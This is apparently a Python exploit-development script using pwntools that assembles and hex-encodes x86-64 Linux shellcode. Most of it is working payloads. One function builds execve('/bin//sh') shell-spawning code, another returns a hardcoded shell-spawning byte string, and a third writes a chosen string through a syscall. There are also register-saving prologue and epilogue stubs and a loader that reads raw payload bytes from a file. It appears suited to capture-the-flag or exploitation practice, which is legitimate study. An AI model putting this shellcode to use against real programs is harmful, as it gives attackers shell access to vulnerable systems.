#!/usr/bin/env python3

import pwnlib
from pwnlib.util.packing import u64
from pwnlib.asm import asm, disasm
from pwnlib.context import context
import binascii

context.os = 'linux'  # pylint: disable=assigning-non-slot
context.arch = 'amd64'  # pylint: disable=assigning-non-slot

prologue = asm('''\
push r15
push r14
push r13
push r12
push rsi
push rdi
push rbx
push rbp
mov rbp, rsp
''')
epilogue = asm('''\
mov rsp, rbp
pop rbp
pop rbx
pop rdi
pop rsi
pop r12
pop r13
pop r14
pop r15
ret
''')


def generate_append_payload() -> str:
    asm_code = ''
    # for _ in range(10):
    #     asm_code += 'nop\n'
    asm_code += 'xor rdx, rdx\n'
    asm_code += 'push rdx\n'
    asm_code += 'mov rax, 0x68732f2f6e69622f\n'
    asm_code += 'push rax\n'
    asm_code += 'mov rdi, rsp\n'
    asm_code += 'push rdx\n'
    asm_code += 'push rdi\n'
    asm_code += 'mov rsi, rsp\n'
    asm_code += 'xor rax, rax\n'
    asm_code += 'mov al, 0x3b\n'
    asm_code += 'syscall\n'
    return binascii.hexlify(asm(asm_code)).decode()


def generate_dummy_payload():

    return binascii.hexlify(b"\x48\x31\xf6\x56\x48\xbf"
                            b"\x2f\x62\x69\x6e\x2f"
                            b"\x2f\x73\x68\x57\x54"
                            b"\x5f\xb0\x3b\x99\x0f\x05").decode()
    # return binascii.hexlify(asm(pwnlib.shellcraft.amd64.linux.sh())).decode()


def get_real_payload():
    with open('f', 'rb') as f:
        return binascii.hexlify(f.read()).decode()


def generate_data_payload(msg: bytes = b'/bin//sh') -> str:
    reg = 'rax'
    msg += b'\n'
    msg_len = len(msg)
    msg += b'\x00' * (-msg_len % 8)
    asm_code = ''
    for i in range(len(msg) // 8 - 1, -1, -1):
        asm_code += f'mov rcx, {u64(msg[i*8:(i+1)*8])}\n'
        asm_code += 'push rcx\n'
    asm_code += 'mov rdi, 1\n'
    asm_code += 'mov rsi, rsp\n'
    asm_code += f'mov rdx, {msg_len}\n'
    asm_code += 'mov rax, 1\n'
    asm_code += 'syscall\n'
    asm_code += f'add {reg}, rcx\n'
    return binascii.hexlify(asm(asm_code)).decode()


if __name__ == '__main__':
    print(disasm(binascii.unhexlify(generate_data_payload())))
    print(disasm(binascii.unhexlify(generate_append_payload())))
